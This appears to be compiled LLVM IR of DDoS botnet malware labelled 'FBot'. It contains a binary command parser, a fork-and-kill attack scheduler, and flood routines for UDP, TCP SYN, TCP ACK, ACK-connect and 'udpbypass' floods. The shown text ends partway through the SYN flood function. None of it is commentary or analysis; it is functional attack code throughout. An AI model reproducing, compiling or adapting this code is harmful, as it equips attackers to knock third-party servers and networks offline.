; ModuleID = 'host/ir_O3/FBot.a.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.command = type { i8, i8* (...)* }
%struct.option = type { i8, i16, i8* }
%struct.target = type { i32, i16 }
%struct.arguments = type { %struct.target*, %struct.option*, i8, i8, i16 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }

@LOCAL_ADDRESS = common local_unnamed_addr global i32 0, align 4
@command_list = common local_unnamed_addr global [6 x %struct.command] zeroinitializer, align 16
@.str = private unnamed_addr constant [34 x i8] c"Sending SYN with ACK: %d SEQ: %d\0A\00", align 1
@.str.1 = private unnamed_addr constant [39 x i8] c"Received SYN-ACK with ACK: %d SEQ: %d\0A\00", align 1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i8* @retrieve_opt_str(%struct.option* nocapture readonly, i8 zeroext, i8 zeroext, i8* readnone) local_unnamed_addr #0 {
  %5 = icmp eq i8 %1, 0
  br i1 %5, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %4
  %wide.trip.count = zext i8 %1 to i64
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph.prol.loopexit, label %.lr.ph.prol.preheader

.lr.ph.prol.preheader:                            ; preds = %.lr.ph.preheader
  br label %.lr.ph.prol

.lr.ph.prol:                                      ; preds = %.lr.ph.prol.preheader
  %6 = getelementptr inbounds %struct.option, %struct.option* %0, i64 0, i32 0
  %7 = load i8, i8* %6, align 8
  %8 = icmp eq i8 %7, %2
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %.lr.ph.prol
  %10 = getelementptr inbounds %struct.option, %struct.option* %0, i64 0, i32 2
  %11 = load i8*, i8** %10, align 8
  br label %12

; <label>:12:                                     ; preds = %9, %.lr.ph.prol
  %.1.prol = phi i8* [ %11, %9 ], [ %3, %.lr.ph.prol ]
  br label %.lr.ph.prol.loopexit

.lr.ph.prol.loopexit:                             ; preds = %.lr.ph.preheader, %12
  %.1.lcssa.unr = phi i8* [ undef, %.lr.ph.preheader ], [ %.1.prol, %12 ]
  %indvars.iv.unr = phi i64 [ 0, %.lr.ph.preheader ], [ 1, %12 ]
  %.0910.unr = phi i8* [ %3, %.lr.ph.preheader ], [ %.1.prol, %12 ]
  %13 = icmp eq i8 %1, 1
  br i1 %13, label %._crit_edge.loopexit, label %.lr.ph.preheader.new

.lr.ph.preheader.new:                             ; preds = %.lr.ph.prol.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %26, %.lr.ph.preheader.new
  %indvars.iv = phi i64 [ %indvars.iv.unr, %.lr.ph.preheader.new ], [ %indvars.iv.next.1, %26 ]
  %.0910 = phi i8* [ %.0910.unr, %.lr.ph.preheader.new ], [ %.1.1, %26 ]
  %14 = getelementptr inbounds %struct.option, %struct.option* %0, i64 %indvars.iv, i32 0
  %15 = load i8, i8* %14, align 8
  %16 = icmp eq i8 %15, %2
  br i1 %16, label %17, label %.lr.ph.112

; <label>:17:                                     ; preds = %.lr.ph
  %18 = getelementptr inbounds %struct.option, %struct.option* %0, i64 %indvars.iv, i32 2
  %19 = load i8*, i8** %18, align 8
  br label %.lr.ph.112

.lr.ph.112:                                       ; preds = %.lr.ph, %17
  %.1 = phi i8* [ %19, %17 ], [ %.0910, %.lr.ph ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %20 = getelementptr inbounds %struct.option, %struct.option* %0, i64 %indvars.iv.next, i32 0
  %21 = load i8, i8* %20, align 8
  %22 = icmp eq i8 %21, %2
  br i1 %22, label %23, label %26

._crit_edge.loopexit.unr-lcssa:                   ; preds = %26
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph.prol.loopexit, %._crit_edge.loopexit.unr-lcssa
  %.1.lcssa = phi i8* [ %.1.lcssa.unr, %.lr.ph.prol.loopexit ], [ %.1.1, %._crit_edge.loopexit.unr-lcssa ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %4
  %.09.lcssa = phi i8* [ %3, %4 ], [ %.1.lcssa, %._crit_edge.loopexit ]
  ret i8* %.09.lcssa

; <label>:23:                                     ; preds = %.lr.ph.112
  %24 = getelementptr inbounds %struct.option, %struct.option* %0, i64 %indvars.iv.next, i32 2
  %25 = load i8*, i8** %24, align 8
  br label %26

; <label>:26:                                     ; preds = %23, %.lr.ph.112
  %.1.1 = phi i8* [ %25, %23 ], [ %.1, %.lr.ph.112 ]
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next.1, %wide.trip.count
  br i1 %exitcond.1, label %._crit_edge.loopexit.unr-lcssa, label %.lr.ph
}

; Function Attrs: noinline nounwind readonly uwtable
define zeroext i16 @retrieve_opt_num(%struct.option* nocapture readonly, i8 zeroext, i8 zeroext, i16 zeroext) local_unnamed_addr #1 {
  %5 = icmp eq i8 %1, 0
  br i1 %5, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %4
  %wide.trip.count = zext i8 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %14
  %indvars.iv = phi i64 [ %indvars.iv.next, %14 ], [ 0, %.lr.ph.preheader ]
  %.0910 = phi i16 [ %.1, %14 ], [ %3, %.lr.ph.preheader ]
  %6 = getelementptr inbounds %struct.option, %struct.option* %0, i64 %indvars.iv, i32 0
  %7 = load i8, i8* %6, align 8
  %8 = icmp eq i8 %7, %2
  br i1 %8, label %9, label %14

; <label>:9:                                      ; preds = %.lr.ph
  %10 = getelementptr inbounds %struct.option, %struct.option* %0, i64 %indvars.iv, i32 2
  %11 = load i8*, i8** %10, align 8
  %12 = tail call i32 @atoi(i8* %11) #12
  %13 = trunc i32 %12 to i16
  br label %14

; <label>:14:                                     ; preds = %.lr.ph, %9
  %.1 = phi i16 [ %13, %9 ], [ %.0910, %.lr.ph ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %14
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %4
  %.09.lcssa = phi i16 [ %3, %4 ], [ %.1, %._crit_edge.loopexit ]
  ret i16 %.09.lcssa
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @retrieve_opt_ipv4(%struct.option* nocapture readonly, i8 zeroext, i8 zeroext, i32) local_unnamed_addr #3 {
  %5 = icmp eq i8 %1, 0
  br i1 %5, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %4
  %wide.trip.count = zext i8 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %13
  %indvars.iv = phi i64 [ %indvars.iv.next, %13 ], [ 0, %.lr.ph.preheader ]
  %.0910 = phi i32 [ %.1, %13 ], [ %3, %.lr.ph.preheader ]
  %6 = getelementptr inbounds %struct.option, %struct.option* %0, i64 %indvars.iv, i32 0
  %7 = load i8, i8* %6, align 8
  %8 = icmp eq i8 %7, %2
  br i1 %8, label %9, label %13

; <label>:9:                                      ; preds = %.lr.ph
  %10 = getelementptr inbounds %struct.option, %struct.option* %0, i64 %indvars.iv, i32 2
  %11 = load i8*, i8** %10, align 8
  %12 = tail call i32 @inet_addr(i8* %11) #13
  br label %13

; <label>:13:                                     ; preds = %.lr.ph, %9
  %.1 = phi i32 [ %12, %9 ], [ %.0910, %.lr.ph ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %13
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %4
  %.09.lcssa = phi i32 [ %3, %4 ], [ %.1, %._crit_edge.loopexit ]
  ret i32 %.09.lcssa
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @command_parse(i8* nocapture readonly, i32) local_unnamed_addr #3 {
  %3 = load i8, i8* %0, align 1
  %4 = getelementptr inbounds i8, i8* %0, i64 1
  %5 = bitcast i8* %4 to i16*
  %6 = load i16, i16* %5, align 2
  %7 = tail call zeroext i16 @ntohs(i16 zeroext %6) #14
  %8 = getelementptr inbounds i8, i8* %0, i64 3
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i64
  %11 = tail call noalias i8* @calloc(i64 %10, i64 8) #13
  %12 = bitcast i8* %11 to %struct.target*
  %13 = icmp eq i8* %11, null
  br i1 %13, label %55, label %14

; <label>:14:                                     ; preds = %2
  %15 = getelementptr inbounds i8, i8* %0, i64 4
  %16 = icmp eq i8 %9, 0
  br i1 %16, label %._crit_edge84, label %.lr.ph83.preheader

.lr.ph83.preheader:                               ; preds = %14
  %17 = zext i8 %9 to i64
  %18 = add nuw nsw i64 %17, 4294967295
  %19 = and i64 %18, 4294967295
  %20 = mul nuw nsw i64 %19, 6
  %21 = add nuw nsw i64 %20, 10
  %wide.trip.count89 = zext i8 %9 to i64
  br label %.lr.ph83

.lr.ph83:                                         ; preds = %.lr.ph83, %.lr.ph83.preheader
  %indvars.iv87 = phi i64 [ 0, %.lr.ph83.preheader ], [ %indvars.iv.next88, %.lr.ph83 ]
  %.081 = phi i8* [ %15, %.lr.ph83.preheader ], [ %30, %.lr.ph83 ]
  %22 = bitcast i8* %.081 to i32*
  %23 = load i32, i32* %22, align 4
  %24 = getelementptr inbounds %struct.target, %struct.target* %12, i64 %indvars.iv87, i32 0
  store i32 %23, i32* %24, align 4
  %25 = getelementptr inbounds i8, i8* %.081, i64 4
  %26 = bitcast i8* %25 to i16*
  %27 = load i16, i16* %26, align 2
  %28 = getelementptr inbounds %struct.target, %struct.target* %12, i64 %indvars.iv87, i32 1
  %29 = tail call zeroext i16 @ntohs(i16 zeroext %27) #14
  store i16 %29, i16* %28, align 4
  %30 = getelementptr inbounds i8, i8* %.081, i64 6
  %indvars.iv.next88 = add nuw nsw i64 %indvars.iv87, 1
  %exitcond90 = icmp eq i64 %indvars.iv.next88, %wide.trip.count89
  br i1 %exitcond90, label %._crit_edge84.loopexit, label %.lr.ph83

._crit_edge84.loopexit:                           ; preds = %.lr.ph83
  %scevgep = getelementptr i8, i8* %0, i64 %21
  br label %._crit_edge84

._crit_edge84:                                    ; preds = %._crit_edge84.loopexit, %14
  %.0.lcssa = phi i8* [ %15, %14 ], [ %scevgep, %._crit_edge84.loopexit ]
  %31 = load i8, i8* %.0.lcssa, align 1
  %32 = icmp eq i8 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %._crit_edge84
  tail call fastcc void @command_flood(i8 zeroext %3, %struct.option* null, i8 zeroext 0, %struct.target* %12, i8 zeroext %9, i16 zeroext %7)
  br label %55

; <label>:34:                                     ; preds = %._crit_edge84
  %35 = zext i8 %31 to i64
  %36 = tail call noalias i8* @calloc(i64 %35, i64 16) #13
  %37 = bitcast i8* %36 to %struct.option*
  %38 = icmp eq i8* %36, null
  br i1 %38, label %40, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %34
  %39 = getelementptr inbounds i8, i8* %.0.lcssa, i64 1
  %wide.trip.count = zext i8 %31 to i64
  br label %.lr.ph

; <label>:40:                                     ; preds = %34
  tail call void @free(i8* nonnull %11) #13
  br label %55

.lr.ph:                                           ; preds = %.lr.ph, %.lr.ph.preheader
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %.lr.ph ]
  %.178 = phi i8* [ %39, %.lr.ph.preheader ], [ %54, %.lr.ph ]
  %41 = load i8, i8* %.178, align 1
  %42 = getelementptr inbounds %struct.option, %struct.option* %37, i64 %indvars.iv, i32 0
  store i8 %41, i8* %42, align 8
  %43 = getelementptr inbounds i8, i8* %.178, i64 1
  %44 = bitcast i8* %43 to i16*
  %45 = load i16, i16* %44, align 2
  %46 = tail call zeroext i16 @ntohs(i16 zeroext %45) #14
  %47 = getelementptr inbounds i8, i8* %.178, i64 3
  %48 = zext i16 %46 to i64
  %49 = add nuw nsw i64 %48, 1
  %50 = tail call noalias i8* @malloc(i64 %49) #13
  %51 = getelementptr inbounds %struct.option, %struct.option* %37, i64 %indvars.iv, i32 2
  store i8* %50, i8** %51, align 8
  %52 = zext i16 %46 to i64
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %50, i8* %47, i64 %52, i32 1, i1 false)
  %53 = getelementptr inbounds i8, i8* %50, i64 %52
  store i8 0, i8* %53, align 1
  %54 = getelementptr inbounds i8, i8* %47, i64 %52
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge, label %.lr.ph

._crit_edge:                                      ; preds = %.lr.ph
  tail call fastcc void @command_flood(i8 zeroext %3, %struct.option* nonnull %37, i8 zeroext %31, %struct.target* %12, i8 zeroext %9, i16 zeroext %7)
  br label %55

; <label>:55:                                     ; preds = %2, %._crit_edge, %40, %33
  ret void
}

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) local_unnamed_addr #5

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @command_flood(i8 zeroext, %struct.option*, i8 zeroext, %struct.target*, i8 zeroext, i16 zeroext) unnamed_addr #3 {
  %7 = alloca %struct.arguments, align 8
  %8 = tail call fastcc i8* (...)* @retrieve_command_func(i8 zeroext %0)
  %9 = icmp eq i8* (...)* %8, null
  br i1 %9, label %25, label %10

; <label>:10:                                     ; preds = %6
  %11 = getelementptr inbounds %struct.arguments, %struct.arguments* %7, i64 0, i32 0
  store %struct.target* %3, %struct.target** %11, align 8
  %12 = getelementptr inbounds %struct.arguments, %struct.arguments* %7, i64 0, i32 2
  store i8 %2, i8* %12, align 8
  %13 = getelementptr inbounds %struct.arguments, %struct.arguments* %7, i64 0, i32 3
  store i8 %4, i8* %13, align 1
  %14 = getelementptr inbounds %struct.arguments, %struct.arguments* %7, i64 0, i32 1
  store %struct.option* %1, %struct.option** %14, align 8
  %15 = getelementptr inbounds %struct.arguments, %struct.arguments* %7, i64 0, i32 4
  store i16 %5, i16* %15, align 2
  %16 = tail call i32 @fork() #13
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %18, label %25

; <label>:18:                                     ; preds = %10
  %19 = tail call i32 @fork() #13
  switch i32 %19, label %22 [
    i32 -1, label %20
    i32 0, label %21
  ]

; <label>:20:                                     ; preds = %18
  tail call void @exit(i32 1) #15
  unreachable

; <label>:21:                                     ; preds = %18
  call fastcc void @terminate_command(%struct.arguments* nonnull %7)
  unreachable

; <label>:22:                                     ; preds = %18
  %23 = bitcast i8* (...)* %8 to i8* (%struct.arguments*, ...)*
  %24 = call i8* (%struct.arguments*, ...) %23(%struct.arguments* nonnull %7) #13
  br label %25

; <label>:25:                                     ; preds = %10, %6, %22
  ret void
}

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #4

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #6

; Function Attrs: noinline norecurse nounwind readonly uwtable
define internal fastcc i8* (...)* @retrieve_command_func(i8 zeroext) unnamed_addr #0 {
  %2 = zext i8 %0 to i64
  %3 = getelementptr inbounds [6 x %struct.command], [6 x %struct.command]* @command_list, i64 0, i64 %2, i32 1
  %4 = load i8* (...)*, i8* (...)** %3, align 8
  ret i8* (...)* %4
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #7

; Function Attrs: noinline noreturn nounwind uwtable
define internal fastcc void @terminate_command(%struct.arguments* nocapture readonly) unnamed_addr #8 {
  %2 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 4
  %3 = load i16, i16* %2, align 2
  %4 = zext i16 %3 to i32
  %5 = tail call i32 @sleep(i32 %4) #13
  %6 = tail call i32 @getppid() #13
  %7 = icmp sgt i32 %6, 1
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %1
  %9 = tail call i32 @kill(i32 %6, i32 9) #13
  br label %10

; <label>:10:                                     ; preds = %8, %1
  %11 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 0
  %12 = load %struct.target*, %struct.target** %11, align 8
  %13 = icmp eq %struct.target* %12, null
  br i1 %13, label %16, label %14

; <label>:14:                                     ; preds = %10
  %15 = bitcast %struct.target* %12 to i8*
  tail call void @free(i8* %15) #13
  br label %16

; <label>:16:                                     ; preds = %10, %14
  %17 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 1
  %18 = load %struct.option*, %struct.option** %17, align 8
  %19 = icmp eq %struct.option* %18, null
  br i1 %19, label %23, label %.preheader

.preheader:                                       ; preds = %16
  %20 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 2
  %21 = load i8, i8* %20, align 8
  %22 = icmp eq i8 %21, 0
  br i1 %22, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

; <label>:23:                                     ; preds = %16
  tail call void @exit(i32 0) #15
  unreachable

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %24 = phi %struct.option* [ %30, %.lr.ph ], [ %18, %.lr.ph.preheader ]
  %25 = getelementptr inbounds %struct.option, %struct.option* %24, i64 %indvars.iv, i32 2
  %26 = load i8*, i8** %25, align 8
  tail call void @free(i8* %26) #13
  %indvars.iv.next = add nuw i64 %indvars.iv, 1
  %27 = load i8, i8* %20, align 8
  %28 = zext i8 %27 to i64
  %29 = icmp slt i64 %indvars.iv.next, %28
  %30 = load %struct.option*, %struct.option** %17, align 8
  br i1 %29, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.lcssa = phi %struct.option* [ %18, %.preheader ], [ %30, %._crit_edge.loopexit ]
  %31 = getelementptr inbounds %struct.option, %struct.option* %.lcssa, i64 0, i32 0
  tail call void @free(i8* %31) #13
  tail call void @exit(i32 0) #15
  unreachable
}

declare i32 @sleep(i32) local_unnamed_addr #9

; Function Attrs: nounwind
declare i32 @getppid() local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #4

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_commands() local_unnamed_addr #10 {
  tail call fastcc void @load_command(i8 zeroext 1, i8* (...)* bitcast (void (%struct.arguments*)* @flood_udp to i8* (...)*))
  tail call fastcc void @load_command(i8 zeroext 3, i8* (...)* bitcast (void (%struct.arguments*)* @flood_tcp_syn to i8* (...)*))
  tail call fastcc void @load_command(i8 zeroext 2, i8* (...)* bitcast (void (%struct.arguments*)* @flood_tcp_ack to i8* (...)*))
  tail call fastcc void @load_command(i8 zeroext 7, i8* (...)* bitcast (void (%struct.arguments*)* @flood_tcp_ack_connect to i8* (...)*))
  tail call fastcc void @load_command(i8 zeroext 20, i8* (...)* bitcast (void (%struct.arguments*)* @flood_udpbypass to i8* (...)*))
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define internal fastcc void @load_command(i8 zeroext, i8* (...)*) unnamed_addr #10 {
  %3 = zext i8 %0 to i64
  %4 = getelementptr inbounds [6 x %struct.command], [6 x %struct.command]* @command_list, i64 0, i64 %3, i32 0
  store i8 %0, i8* %4, align 16
  %5 = getelementptr inbounds [6 x %struct.command], [6 x %struct.command]* @command_list, i64 0, i64 %3, i32 1
  store i8* (...)* %1, i8* (...)** %5, align 8
  ret void
}

; Function Attrs: noinline noreturn nounwind uwtable
define void @flood_udp(%struct.arguments* nocapture readonly) #8 {
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 1
  %5 = load %struct.option*, %struct.option** %4, align 8
  %6 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 2
  %7 = load i8, i8* %6, align 8
  %8 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 2, i16 zeroext 900)
  %9 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 1, i16 zeroext -1)
  %10 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 3
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i64
  %13 = tail call noalias i8* @calloc(i64 %12, i64 8) #13
  %14 = bitcast i8* %13 to i8**
  %15 = icmp eq i8* %13, null
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %1
  tail call void @exit(i32 1) #15
  unreachable

; <label>:17:                                     ; preds = %1
  %18 = tail call noalias i8* @calloc(i64 %12, i64 4) #13
  %19 = bitcast i8* %18 to i32*
  %20 = icmp eq i8* %18, null
  br i1 %20, label %34, label %.preheader42

.preheader42:                                     ; preds = %17
  %21 = icmp eq i8 %11, 0
  br i1 %21, label %.preheader, label %.lr.ph45

.lr.ph45:                                         ; preds = %.preheader42
  %22 = zext i16 %8 to i32
  %23 = add nuw nsw i32 %22, 1
  %24 = zext i32 %23 to i64
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 0
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 1
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  %28 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  %31 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 0
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2, i32 0
  %33 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  br label %37

; <label>:34:                                     ; preds = %17
  tail call void @exit(i32 1) #15
  unreachable

.preheader.loopexit:                              ; preds = %59
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader42
  %35 = phi i8 [ 0, %.preheader42 ], [ %62, %.preheader.loopexit ]
  %36 = zext i16 %8 to i64
  br label %.loopexit

; <label>:37:                                     ; preds = %.lr.ph45, %59
  %indvars.iv46 = phi i64 [ 0, %.lr.ph45 ], [ %indvars.iv.next47, %59 ]
  %38 = call i32 @socket(i32 2, i32 2, i32 0) #13
  %39 = getelementptr inbounds i32, i32* %19, i64 %indvars.iv46
  store i32 %38, i32* %39, align 4
  %40 = icmp eq i32 %38, -1
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %37
  call void @exit(i32 1) #15
  unreachable

; <label>:42:                                     ; preds = %37
  %43 = call noalias i8* @malloc(i64 %24) #13
  %44 = getelementptr inbounds i8*, i8** %14, i64 %indvars.iv46
  store i8* %43, i8** %44, align 8
  %45 = icmp eq i8* %43, null
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %42
  call void @exit(i32 1) #15
  unreachable

; <label>:47:                                     ; preds = %42
  store i16 2, i16* %25, align 4
  store i16 0, i16* %26, align 2
  store i32 0, i32* %27, align 4
  %48 = call i32 @bind(i32 %38, %struct.sockaddr* nonnull %28, i32 16) #13
  store i16 2, i16* %29, align 4
  %49 = call zeroext i16 @htons(i16 zeroext %9) #14
  store i16 %49, i16* %30, align 2
  %50 = load %struct.target*, %struct.target** %31, align 8
  %51 = getelementptr inbounds %struct.target, %struct.target* %50, i64 %indvars.iv46, i32 1
  %52 = load i16, i16* %51, align 4
  %53 = icmp ult i16 %52, 32
  %54 = getelementptr inbounds %struct.target, %struct.target* %50, i64 %indvars.iv46, i32 0
  %55 = load i32, i32* %54, align 4
  br i1 %53, label %56, label %59

; <label>:56:                                     ; preds = %47
  %57 = call i32 @ntohl(i32 %55) #14
  %58 = call i32 @htonl(i32 %57) #14
  br label %59

; <label>:59:                                     ; preds = %47, %56
  %60 = phi i32 [ %58, %56 ], [ %55, %47 ]
  store i32 %60, i32* %32, align 4
  %61 = call i32 @connect(i32 %38, %struct.sockaddr* nonnull %33, i32 16) #13
  call void @rand_string(i8* nonnull %43, i32 %22)
  %indvars.iv.next47 = add nuw i64 %indvars.iv46, 1
  %62 = load i8, i8* %10, align 1
  %63 = zext i8 %62 to i64
  %64 = icmp slt i64 %indvars.iv.next47, %63
  br i1 %64, label %37, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %.lr.ph
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  %65 = phi i8 [ %35, %.preheader ], [ %.be, %.loopexit.backedge ]
  %66 = icmp eq i8 %65, 0
  br i1 %66, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  %.be = phi i8 [ 0, %.loopexit ], [ %72, %.loopexit.loopexit ]
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %67 = getelementptr inbounds i32, i32* %19, i64 %indvars.iv
  %68 = load i32, i32* %67, align 4
  %69 = getelementptr inbounds i8*, i8** %14, i64 %indvars.iv
  %70 = load i8*, i8** %69, align 8
  %71 = call i64 @send(i32 %68, i8* %70, i64 %36, i32 16384) #13
  %indvars.iv.next = add nuw i64 %indvars.iv, 1
  %72 = load i8, i8* %10, align 1
  %73 = zext i8 %72 to i64
  %74 = icmp slt i64 %indvars.iv.next, %73
  br i1 %74, label %.lr.ph, label %.loopexit.loopexit
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #5

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #5

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #9

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #9

; Function Attrs: noinline noreturn nounwind uwtable
define void @flood_tcp_syn(%struct.arguments* nocapture readonly) #8 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %2, align 4
  %4 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 1
  %5 = load %struct.option*, %struct.option** %4, align 8
  %6 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 2
  %7 = load i8, i8* %6, align 8
  %8 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 2, i16 zeroext 900)
  %9 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 1, i16 zeroext -1)
  %10 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 7, i16 zeroext 255)
  %11 = trunc i16 %10 to i8
  %12 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 8, i16 zeroext -1)
  %13 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 9, i16 zeroext 0)
  %14 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 10, i16 zeroext 0)
  %15 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 11, i16 zeroext 0)
  %16 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 12, i16 zeroext 0)
  %17 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 13, i16 zeroext 0)
  %18 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 14, i16 zeroext 1)
  %19 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 15, i16 zeroext 0)
  %20 = trunc i16 %19 to i8
  %21 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 16, i16 zeroext -1)
